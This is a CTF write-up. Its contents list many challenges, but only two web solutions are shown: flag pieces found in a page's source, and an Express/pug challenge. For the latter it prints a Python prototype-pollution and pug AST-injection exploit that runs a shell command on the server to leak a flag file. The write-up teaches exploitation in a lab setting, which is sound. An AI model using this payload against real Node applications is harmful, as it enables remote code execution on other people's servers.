# DarkCTF Writeups
Author: [Gallifrey](https://github.com/gall1frey)

### Contents
- [Web](#web)
    - [Inspector Gadget](#inspectorGadget)
    - [BlitzProp](#blitzProp)
    - [MiniSTRyplace](#miniSTRyplace)
    - [Caas](#caas)
    - [Wild Goose Hunt](#wildGooseHunt)
- [Crypto](#crypto)
    - [Nintendo Base64](#nintendoBase64)
    - [Phase Stream 1](#phaseStream1)
    - [Phase Stream 2](#phaseStream2)
    - [Phase Stream 3](#phaseStream3)
    - [Phase Stream 4](#phaseStream4)
    - [SoulCrabber](#soulCrabber)
    - [SoulCrabber2](#soulCrabber2)
- [Reversing](#rev)
    - [Authenticator](#authenticator)
    - [Passphrase](#passphrase)
- [Forensics](#forensics)
    - [Key mission](#keyMission)
    - [Invitation](#invitation)
    - [AlienPhish](#alienPhish)
- [Hardware](#hardware)
    - [Serial Logs](#serialLogs)
    - [Compromised](#compromised)
    - [Secure](#secure)
    - [Off The Grid](#offTheGrid)
- [Misc](#misc)
    - [Alien Camp](#alienCamp)
    - [Input as a Service](#inputAsAService)
    


# Web<a name="web"></a>
## Inspector Gadget<a name="inspectorGadget"></a>
### Solution
Was a very simple web chall. 
The web page already had the first part of the flag, ```CHTB{```. Viewing the source code got usthe next part, ```1nsp3ction_```.
Checking out the css file, we get the third part, ```c4n_r3ve4l```. Finally, checking out the main.js file gives us the last piece: ```us3full_1nf0rm4tion}```.

The flag is:
```
CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}
```

## BlitzProp<a name="blitzProp"></a>
```
A tribute page to the legendary alien band called BlitzProp!
```
The challenge came with the source code, ```web_blitzprop.zip```

On starting the docker container, we are greeted with a web page that asks us to enter a favourite song. If the entered field isn't a name of one of the songs listed, we get a response saying ```Please provide us with the name of an existing song.```

### Solution
Looking at the source code that handles this:
```javascript
router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { song } = unflatten(req.body);

	if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the name of an existing song.'
		});
	}
});
```
We can see that the input is only being checked to see if it _contains_ that string. It means we can append other stuff to our input and it won't make a difference. 
Also, there is another line worth noting:
```javascript 'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })```
pug.compile converts a string into a template function and executes it. This is vulnerable. We can use AST injection to execute remote code. Also, according to the zip file, the file containing the flag is called ```flag```.

The attack:
```python
import requests

TARGET_URL = '<url of the target>'

# make pollution
r=requests.post(TARGET_URL + '/api/submit', json = {
    "song.name":"Not Polluting with the boys",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('cat flag* > views/index.html')"
    }
})
# execute
print(requests.get(TARGET_URL).text)
```
The first part of the script overwrites ```index.html``` with the contents of the file ```flag```. So the next time we access ```index.html```, it prints out the contents of the file ```flag```.
```
CHTB{p0llute_with_styl3}
```

